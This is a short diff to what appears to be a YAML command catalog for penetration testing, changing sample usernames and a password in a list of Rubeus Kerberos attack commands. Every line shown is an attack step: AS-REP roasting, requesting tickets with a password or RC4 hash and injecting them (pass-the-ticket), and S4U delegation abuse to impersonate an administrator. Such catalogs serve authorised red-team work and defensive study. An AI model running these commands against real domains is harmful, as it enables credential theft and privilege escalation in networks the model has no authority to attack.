@@ -10,10 +10,10 @@ command: |
   .\Rubeus.exe asreproast /outfile:asrep.txt
 
   # Request TGT with password
-  .\Rubeus.exe asktgt /user:john /password:password123 /ptt
+  .\Rubeus.exe asktgt /user:pentuser /password:P@ssw0rd123 /ptt
 
   # Request TGT with hash
-  .\Rubeus.exe asktgt /user:john /rc4:HASH /ptt
+  .\Rubeus.exe asktgt /user:pentuser /rc4:HASH /ptt
 
   # S4U delegation abuse
   .\Rubeus.exe s4u /user:MACHINE$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.test.local /ptt
